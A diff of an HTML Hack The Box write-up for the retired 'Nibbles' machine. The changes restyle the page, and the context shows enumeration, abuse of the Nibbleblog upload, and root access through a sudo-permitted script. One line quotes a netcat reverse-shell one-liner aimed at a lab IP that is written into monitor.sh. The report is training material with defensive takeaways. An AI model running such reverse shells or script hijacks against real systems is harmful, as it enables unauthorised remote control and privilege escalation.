@@ -1,25 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Nibbles - HTB Report</title>
-    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="../style.css" />
   </head>
-
   <body>
-    <header>
-      <h1>Nibbles</h1>
-      <p>Hack The Box Retired Machine Report</p>
+    <header class="site-header">
+      <nav class="nav">
+        <a class="brand" href="../index.html">HTB Reports</a>
+        <a class="nav-pill" href="../index.html">All reports</a>
+      </nav>
     </header>
 
-    <main class="report">
-      <h2>Machine Info</h2>
+    <section class="hero">
+      <div class="hero-card">
+        <p class="eyebrow">Hack The Box Walkthrough</p>
+        <h1 class="main-title">Nibbles</h1>
+        <p class="subtitle">Hack The Box retired machine report</p>
+      </div>
+    </section>
+
+    <div class="layout">
+      <aside>
+        <h2>Contents</h2>
+        <div class="toc"><a href="#machine-info">Machine Info</a><a href="#summary">Summary</a><a href="#recon-enumeration">Recon / Enumeration</a><a href="#initial-foothold">Initial Foothold</a><a href="#privilege-escalation">Privilege Escalation</a><a href="#tools-used">Tools Used</a><a href="#important-commands">Important Commands</a><a href="#vulnerabilities-misconfiguration">Vulnerabilities / Misconfiguration</a><a href="#defensive-takeaways">Defensive Takeaways</a><a href="#lessons-learned">Lessons Learned</a></div>
+      </aside>
+
+      <main class="report-shell">
+        <div id="overview"></div>
+        
+      <h2 id="machine-info">Machine Info</h2>
       <p><strong>Difficulty:</strong> Easy</p>
       <p><strong>Operating System:</strong> Linux</p>
       <p><strong>Status:</strong> Retired</p>
       <p><strong>Date Completed:</strong>06 June 2026</p>
 
-      <h2>Summary</h2>
+      <h2 id="summary">Summary</h2>
       <p>
         Nibbles is an easy Linux machine that focuses on web enumeration, credential discovery,
         authenticated file upload abuse, and basic Linux privilege escalation. The initial foothold
@@ -29,7 +47,7 @@
         script as root without a password.
       </p>
 
-      <h2>Recon / Enumeration</h2>
+      <h2 id="recon-enumeration">Recon / Enumeration</h2>
       <pre><code>nmap -sC -sV -oN nibbles.txt 10.129.11.14</code></pre>
 
       <p>This scan found a total of 2 TCP ports open on the remote host.</p>
@@ -64,7 +82,7 @@
         </tbody>
       </table>
 
-      <h2>Initial Foothold</h2>
+      <h2 id="initial-foothold">Initial Foothold</h2>
       <p>
         After the initial scan, I used <code>searchsploit</code> to check for potential vulnerabilities
         affecting the identified version of OpenSSH. OpenSSH 7.2p2 has a known username enumeration issue,
@@ -151,7 +169,7 @@
 
       <pre><code>cat /home/nibbler/user.txt</code></pre>
 
-      <h2>Privilege Escalation</h2>
+      <h2 id="privilege-escalation">Privilege Escalation</h2>
       <p>
         The next step was to escalate privileges and attempt to gain access to the root flag. I started
         by checking the user’s home directory and found a file named <code>personal.zip</code>.
@@ -212,7 +230,7 @@ chmod +x linpeas.sh
 
       <pre><code>cat /root/root.txt</code></pre>
 
-      <h2>Tools Used</h2>
+      <h2 id="tools-used">Tools Used</h2>
       <ul>
         <li>Nmap</li>
         <li>Searchsploit</li>
@@ -224,7 +242,7 @@ chmod +x linpeas.sh
         <li>Linux command line tools</li>
       </ul>
 
-      <h2>Important Commands</h2>
+      <h2 id="important-commands">Important Commands</h2>
       <pre><code>nmap -sC -sV -oN nibbles.txt 10.129.11.14
 
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://nibbles.htb/nibbleblog
@@ -259,7 +277,7 @@ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.209 
 
 sudo ./monitor.sh</code></pre>
 
-      <h2>Vulnerabilities / Misconfiguration</h2>
+      <h2 id="vulnerabilities-misconfiguration">Vulnerabilities / Misconfiguration</h2>
       <p>
         The main vulnerability on this machine was weak credential usage for the Nibbleblog admin panel.
         The application exposed files that helped identify a valid username and hinted at a likely password.
@@ -274,7 +292,7 @@ sudo ./monitor.sh</code></pre>
         root.
       </p>
 
-      <h2>Defensive Takeaways</h2>
+      <h2 id="defensive-takeaways">Defensive Takeaways</h2>
       <p>
         Web applications should avoid exposing sensitive configuration files or user files through the web
         root. Administrative panels should use strong passwords, account lockout protections, and should not
@@ -288,7 +306,7 @@ sudo ./monitor.sh</code></pre>
         should not be writable by low-privileged users, and should use absolute paths inside the script.
       </p>
 
-      <h2>Lessons Learned</h2>
+      <h2 id="lessons-learned">Lessons Learned</h2>
       <p>
         This machine reinforced the importance of checking page source code, enumerating hidden web
         directories, and reviewing exposed application files. It also showed how weak credentials and
@@ -302,6 +320,12 @@ sudo ./monitor.sh</code></pre>
       </p>
 
       <p><a href="../index.html">Back to all reports</a></p>
-    </main>
+    
+        <footer class="report-footer">
+          <a class="back-link" href="../index.html">Back to all reports</a>
+          <p class="footer-note">HTB report • aligned with the Blocky layout</p>
+        </footer>
+      </main>
+    </div>
   </body>
 </html>
